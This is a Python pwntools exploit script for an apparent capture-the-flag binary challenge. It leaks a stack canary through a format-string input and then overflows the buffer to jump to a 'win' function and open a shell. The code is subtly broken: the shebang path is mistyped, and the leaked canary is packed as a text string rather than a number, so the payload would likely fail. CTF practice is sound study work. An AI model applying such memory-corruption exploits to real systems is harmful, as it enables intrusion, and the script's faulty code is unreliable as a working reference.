#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local = True
if(local):
    io = process(exe)
else:
    io = remote('beginners-rop-pwn.wanictf.org', 9006)

# =========================================================
#                         ADDRESSES
# =========================================================
win = 0x40123d

# =========================================================
#                         EXPLOITS
# =========================================================

# Manual Calculation from Ghidra Stack
offset = 40

# format string to leak canary
io.sendlineafter(b'Do you agree with me? : ', '%9$p'.encode())
canary = io.recvline().decode().strip()
log.info(f"{canary=}")

# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())
# gdb.attach(io, gdbscript=gdbscript)

# flattening  payload here
payload = flat({
    offset: [
        canary,
        win
    ]
})

# send payload to get shell
io.sendlineafter(b'Do you agree with me? : ', payload)

io.interactive()